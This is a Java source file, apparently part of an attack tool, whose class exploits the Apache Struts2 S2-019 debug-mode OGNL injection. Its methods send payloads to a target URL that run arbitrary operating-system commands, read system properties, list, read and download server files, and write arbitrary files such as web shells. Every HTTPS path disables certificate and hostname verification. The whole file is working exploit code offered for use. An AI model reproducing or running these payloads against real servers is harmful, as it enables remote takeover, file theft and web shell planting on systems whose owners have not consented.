package org.vit.service.impl;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import org.vit.model.MyURL;
import org.vit.service.ExploitService;

public class Struts2_S019_ExploitServiceImpl implements ExploitService{

	@Override
	public String getRealPath(MyURL myURL) throws Exception {
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest(),"
						+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
						+ "#path=#req.getSession().getServletContext().getRealPath(\"/\")",
						"UTF-8");

		String requestURL = myURL.getUrl()
				+ "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,"
				+ commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader = null;

		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		} else {
			HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
			
			SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf = new StringBuffer();
		String content = "";
		buf.append("\u7269\u7406\u5730\u5740\uff1a");
		while ((content = reader.readLine()) != null) {
			buf.append(content);
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public Map<String, String> getServerInfo(MyURL myURL,Map<String, String>properties) throws Exception {
		
		Map<String, String>echo=new LinkedHashMap<String,String>();
		
		for (Entry<String, String> entry:properties.entrySet()) {
			
			String commandURL = URLEncoder.encode("#property=@java.lang.System@getProperty(\""+entry.getValue()+"\")","UTF-8");
			String requestURL = myURL.getUrl() + "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
			URL url = new URL(requestURL);
			BufferedReader reader=null;
			
			if (myURL.getMode().equals("http")) {
				HttpURLConnection connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");
				connection.connect();
				connection.setConnectTimeout(10000);
				reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			}else {
			    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
			    
			    SSLContext sc = SSLContext.getInstance("SSL");
				sc.init(null, new TrustManager[] {
					new X509TrustManager() {
						public java.security.cert.X509Certificate[] getAcceptedIssuers() {
							return null;
						}
						public void checkClientTrusted(
							java.security.cert.X509Certificate[] certs, String authType) {
						}
						public void checkServerTrusted(
							java.security.cert.X509Certificate[] certs, String authType) {
						}
					}
				}, new java.security.SecureRandom());
				HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
				HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
					@Override
					public boolean verify(String string,SSLSession ssls) {
						return true;
					}
				});
				
				connection.setRequestMethod("GET");
				connection.connect();
				connection.setConnectTimeout(10000);
				reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			}
			StringBuffer buf=new StringBuffer();
			String content = "";
			while ((content = reader.readLine()) != null) {
				buf.append(content);
			}
			echo.put(entry.getKey(),buf.toString());
			reader.close();
		}
		return echo;
	}

	@Override
	public String doExecutCMD(MyURL myURL, String cmd) throws Exception {
		
		String commandURL = URLEncoder.encode("#a=@java.lang.Runtime@getRuntime().exec('"+cmd+"')," +
				"#b=#a.getInputStream()," +
				"#dis=new java.io.DataInputStream(#b),"+
				"#buf=new byte[1024*50]," +
				"#dis.read(#buf),"+
				"#dis.close(),"+
				"#msg=new java.lang.String(#buf),"+
				"#msg=#msg.trim()","UTF-8");
		
		String requestURL = myURL.getUrl() + "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String content = "";
		while ((content = reader.readLine()) != null) {
			buf.append(content+"\r\n");
		}
		reader.close();
		return buf.toString();
		
	}

	@Override
	public String doUplaod(MyURL myURL, String fileName, String content)throws Exception {
		
		fileName="/"+fileName;
		content=content.replace("\"","\\\"");
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=#req.getSession().getServletContext().getRealPath(\"/\"),"+
				"#content=new java.lang.String(\""+content+"\")," +
				"#file=new java.io.File(#path +\""+fileName+"\")," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close(),"+
				"#resp.getWriter().println(\"ok\")," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF8");
		
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.setConnectTimeout(10000);
			connection.connect();
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		return buf.toString();
		
	}

	@Override
	public String doGetFileSystem(MyURL myURL, String agrs) throws Exception {
		String commandURL = URLEncoder.encode("#sys=@java.io.File@listRoots()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#resp.getWriter().println(#sys"+agrs+")," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()","UTF8");
		
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		return buf.toString();
	}

	@Override
	public String doListFiles(MyURL myURL, String path, String agrs)throws Exception {
		String commandURL = URLEncoder.encode("#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#file=new java.io.File(\""+path+"\")," +
				"#resp.getWriter().println(#file.listFiles()"+agrs+".getName())," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()","UTF8");
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public int doGetFileNum(MyURL myURL, String path) throws Exception {
		String commandURL = URLEncoder.encode("#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#file=new java.io.File(\""+path+"\")," +
				"#resp.getWriter().println(#file.listFiles().length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()","UTF8");
		
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
		    
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		return Integer.parseInt(buf.toString());
	}

	@Override
	public String doGetFileContent(MyURL myURL, String path) throws Exception {

			String commandURL = URLEncoder.encode("#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#file=new java.io.File(\""+path+"\")," +
				"#read=new java.io.BufferedReader(new java.io.InputStreamReader(new java.io.FileInputStream(#file))),"+
				"#lenth=#file.length(),"+
				"#buf=new char[#lenth]," +
				"#read.read(#buf),"+
				"#read.close(),"+
				"#content=new java.lang.String(#buf),"+
				"#resp.getWriter().println(#content)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()","UTF8");
		
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream(),"UTF-8"));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream(),"UTF-8"));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str+"\r\n");
		}
		
		return buf.toString();
	}

	@Override
	public boolean doIsDirectory(MyURL myURL, String path) throws Exception {
		String commandURL =URLEncoder.encode("${#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')," +
				"#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')," +
				"#file=new java.io.File(\""+path+"\")," +
				"#resp.getWriter().println(#file.isDirectory())," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close()}","UTF8");
		
		String requestURL =myURL.getUrl()+ "?redirect:" + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		if (buf.toString().equals("false")) {
			return false;
		}else {
			return true;
		}
	}
	
	
	@Override
	public String doCustomUplaod(MyURL myURL, String filePath, String content)throws Exception {
		content=content.replace("\"","\\\"");
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#path=new java.lang.String(\""+filePath.trim()+"\")," +
				"#content=new java.lang.String(\""+content+"\")," +
				"#file=new java.io.File(#path)," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close(),"+
				"#resp.getWriter().println(\"ok\")," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF8");
		
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		BufferedReader reader=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.connect();
			connection.setConnectTimeout(10000);
			reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		}
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str);
		}
		reader.close();
		return buf.toString();
	}

	@Override
	public void doDownload(MyURL myURL, String rpath, String lpath)throws Exception {
		
		String commandURL = URLEncoder.encode("#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse(),"+
				"#file=new java.io.File(\""+rpath+"\")," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#lenth=#file.length(),"+
				"#buf=new byte[#lenth]," +
				"#dis.readFully(#buf),"+
				"#dis.close(),"+
				"#resp.getWriter().println(new java.lang.String(#buf))," +
				"#resp.getWriter().flush(),"+
				"#resp.getWriter().close()","UTF8");
		
		String requestURL = myURL.getUrl()+"?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29," + commandURL;
		URL url = new URL(requestURL);
		InputStream inputStream=null;
		
		if (myURL.getMode().equals("http")) {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.setConnectTimeout(10000);
			connection.connect();
			inputStream=connection.getInputStream();
		}else {
		    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
		    
		    SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, new TrustManager[] {
				new X509TrustManager() {
					public java.security.cert.X509Certificate[] getAcceptedIssuers() {
						return null;
					}
					public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
					public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
					}
				}
			}, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier() {
				@Override
				public boolean verify(String string,SSLSession ssls) {
					return true;
				}
			});
			
			connection.setRequestMethod("GET");
			connection.setConnectTimeout(10000);
			connection.connect();
			inputStream=connection.getInputStream();
		}
		
		FileOutputStream fos=new FileOutputStream(new File(lpath));
		
		int m=0;
		while ((m=inputStream.read())!=-1) {
			fos.write(m);
		}
		fos.flush();
		fos.close();
		
	}

	
}
